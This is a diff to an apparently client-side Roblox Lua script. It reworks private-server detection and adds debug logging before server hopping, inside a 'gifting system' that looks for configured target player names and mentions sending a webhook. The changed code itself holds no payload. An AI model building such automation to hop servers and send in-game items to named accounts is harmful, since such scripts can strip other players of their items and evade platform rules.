@@ -784,14 +784,60 @@ end
 
 -- Server Hopping Functions
 local function IsServerPrivate()
+    -- Neue robuste Methode zur Private Server Erkennung
     local isPrivate = false
+    
     pcall(function()
-        if game.PrivateServerId and game.PrivateServerId ~= "" then
+        -- Methode 1: PrivateServerId prüfen (funktioniert nicht immer in LocalScript)
+        if game.PrivateServerId and game.PrivateServerId ~= "" and game.PrivateServerId ~= "0" then
             isPrivate = true
-        elseif Players.MaxPlayers <= 6 then
+            Log("🔒 Private server detected via PrivateServerId")
+            return
+        end
+        
+        -- Methode 2: Sehr kleine MaxPlayers (konservativ - nur bei <=4 Spielern)
+        if Players.MaxPlayers <= 4 then
             isPrivate = true
+            Log("🔒 Private server detected via very small MaxPlayers: " .. Players.MaxPlayers)
+            return
+        end
+        
+        -- Methode 3: Kombiniere mehrere Indikatoren für bessere Sicherheit
+        local suspiciousFactors = 0
+        
+        -- JobId zu kurz
+        local jobId = game.JobId
+        if jobId and #jobId > 0 and #jobId < 25 then
+            suspiciousFactors = suspiciousFactors + 1
+            Log("⚠️ Short JobId detected: " .. #jobId)
+        end
+        
+        -- PlaceVersion 0
+        if game.PlaceVersion == 0 then
+            suspiciousFactors = suspiciousFactors + 1
+            Log("⚠️ PlaceVersion 0 detected")
+        end
+        
+        -- Wenige Spieler UND kleine MaxPlayers
+        if Players.MaxPlayers <= 12 and #Players:GetPlayers() <= 2 then
+            suspiciousFactors = suspiciousFactors + 1
+            Log("⚠️ Small server with few players detected")
+        end
+        
+        -- Nur als privat markieren wenn mehrere Faktoren zutreffen
+        if suspiciousFactors >= 2 then
+            isPrivate = true
+            Log("🔒 Private server detected via multiple factors: " .. suspiciousFactors)
+            return
         end
     end)
+    
+    if isPrivate then
+        Log("🔒 Server classified as PRIVATE")
+    else
+        Log("🌐 Server classified as PUBLIC")
+    end
+    
     return isPrivate
 end
 
@@ -1010,11 +1056,34 @@ end
 local function Main()
     Log("🌱 Gifting system started, looking for: " .. table.concat(Config.TargetPlayerNames, ", "))
     
-    -- Check if we should server hop immediately
-    if Config.ServerHoppingEnabled and (IsServerPrivate() or IsServerFull()) then
-        Log("🔄 Server is private or full, attempting to hop...")
+    -- Debug: Server info ausgeben
+    Log("📊 Server Debug Info:")
+    Log("  JobId: " .. (game.JobId or "nil") .. " (Length: " .. #(game.JobId or "") .. ")")
+    Log("  MaxPlayers: " .. Players.MaxPlayers)
+    Log("  CurrentPlayers: " .. #Players:GetPlayers())
+    Log("  PlaceVersion: " .. game.PlaceVersion)
+    
+    pcall(function()
+        Log("  PrivateServerId: " .. (game.PrivateServerId or "nil"))
+    end)
+    
+    -- Warte ein bisschen bevor wir Server Hopping prüfen (für stabilere Detection)
+    wait(5)
+    
+    -- Check if we should server hop, aber nur wenn wirklich sicher
+    local isPrivate = IsServerPrivate()
+    local isFull = IsServerFull()
+    
+    if Config.ServerHoppingEnabled and isPrivate then
+        Log("🔄 Server is definitively private, attempting to hop...")
         ServerHop()
         return
+    elseif Config.ServerHoppingEnabled and isFull then
+        Log("🔄 Server is full (" .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "), attempting to hop...")
+        ServerHop()
+        return
+    else
+        Log("✅ Server seems to be public and not full, continuing...")
     end
     
     -- Send initial webhook when script loads
